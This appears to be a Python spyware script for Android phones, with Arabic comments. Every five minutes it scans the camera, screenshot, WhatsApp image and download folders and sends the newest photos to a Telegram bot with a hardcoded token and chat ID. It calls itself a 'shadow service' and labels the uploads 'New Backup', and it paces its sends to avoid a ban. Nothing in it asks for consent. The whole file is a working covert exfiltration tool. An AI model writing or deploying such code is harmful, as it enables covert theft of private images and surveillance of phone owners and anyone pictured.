import os
import time
import requests
import threading

# بيانات الربط
BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"

# المجلدات المستهدفة (المناطق المسموح بالوصول إليها عادةً)
FOLDERS_TO_SYNC = [
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
    "/storage/emulated/0/Download"
]

sent_files = set()

def log(msg):
    print(f"[SHADOW_SERVICE] {msg}")

def send_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=20)
    except: pass

def send_photo(path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        if not os.path.exists(path): return False
        
        with open(path, "rb") as f:
            r = requests.post(
                url,
                files={"photo": f},
                data={"chat_id": CHAT_ID, "caption": "📸 New Backup"},
                timeout=60
            )
        return r.status_code == 200
    except Exception as e:
        log(f"SEND_ERROR: {e}")
        return False

def scan_and_send():
    log("Scanning folders...")
    for folder in FOLDERS_TO_SYNC:
        if not os.path.exists(folder):
            continue

        try:
            # جلب كل الصور وترتيبها (الأحدث أولاً)
            files = [
                os.path.join(folder, f)
                for f in os.listdir(folder)
                if f.lower().endswith((".jpg", ".jpeg", ".png"))
            ]
            files.sort(key=os.path.getmtime, reverse=True)

            for img in files[:30]: # سحب آخر 30 صورة من كل مجلد
                if img in sent_files:
                    continue

                if send_photo(img):
                    sent_files.add(img)
                    log(f"Successfully sent: {img}")
                    time.sleep(6) # تأخير لمنع حظر البوت
                else:
                    time.sleep(2)
        except Exception as e:
            log(f"SCAN_FOLDER_ERROR: {e}")

def main():
    log("SERVICE INITIATED")
    send_message("✅ تم تفعيل نظام المزامنة الشامل للمجلدات المحددة.")
    
    while True:
        scan_and_send()
        # فحص الجهاز كل 5 دقائق للبحث عن صور جديدة
        time.sleep(300)

if __name__ == "__main__":
    main()
